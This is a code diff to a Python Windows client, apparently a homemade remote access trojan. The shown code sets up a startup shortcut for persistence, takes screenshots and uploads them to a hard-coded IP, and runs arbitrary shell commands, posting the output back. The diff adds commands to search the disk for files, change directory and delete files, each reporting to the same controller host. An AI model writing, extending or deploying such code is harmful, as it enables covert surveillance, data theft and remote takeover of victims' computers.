@@ -2,10 +2,11 @@
 import requests
 import subprocess 
 import time
+import datetime
 import os
 import winshell
 from win32com.client import Dispatch
-import pyautogui
+import pyautogui #it help to capture the screen
 import tempfile #used this module to store snapshot of desktop in temp folder
 
 save = tempfile.mkdtemp("screen")#make an folder in temp
@@ -20,10 +21,8 @@ def main():
     path = os.path.join(destination, "Client.pyw - Shortcut.lnk")#here set the path along it's name 7 extension
     #now we have to set the link file source
     target = r""+cwd+"\Client.pyw"
-    print(target)
     #now set the current file icon for it
     icon = r""+cwd+"\Client.pyw"
-    print(icon)
     for files in source:
         if files == "Client.pyw":
             #here we have to pass all objects we are created for sent icon,path & target etc
@@ -69,6 +68,36 @@ while True:
         url='http://192.168.208.136/store'
         files = {'file': open(save+'\Screenshot.png', 'rb')} #and access the snapshot by giving permission
         r=requests.post(url, files=files)
+    elif 'search' in command:
+        command = command[7:]# look for only file name and remove the search word.
+        path,ext=command.split('*')#remove the * from it. we look for extension.
+        list = ''  # here we define a string where we will append our result on it.
+        for dirpath, dirname, files in os.walk(path): #os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values
+            #that three values couble be dirpath, dirname, files
+            for file in files:
+                if file.endswith(ext):
+                    list = list + '\n' + os.path.join(dirpath, file)
+        r=requests.post("http://192.168.208.136", data= list)
+    elif 'cd' in command:
+        if len(command)<=2: #we look for path
+            r=requests.post("http://192.168.208.136", data= "Enter with Location")
+        else:
+            code,directory = command.split(' ') #split the path and cd command
+            if directory == "Desktop":#here we check for Desktop commands
+                os.chdir('C:\\Users\\'+username+'\\'+directory)
+                r=requests.post("http://192.168.208.136", data= "changes to "+os.getcwd())
+            else:
+                os.chdir(directory) # changing the directory
+                r=requests.post("http://192.168.208.136", data= "changes to "+os.getcwd())
+    elif 'remove' in command:
+        if len(command)<=5:
+            r=requests.post("http://192.168.208.136", data= "also enter the filename")
+        else:
+            code,filename = command.split(' ') #split the filename and remove command
+            if os.path.exists(filename):
+                os.remove(filename)
+            else:
+                r=requests.post("http://192.168.208.136", data= "The file does not exist")
     else:
         CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
         post_response = requests.post(url='http://192.168.208.136', data=CMD.stdout.read() ) 
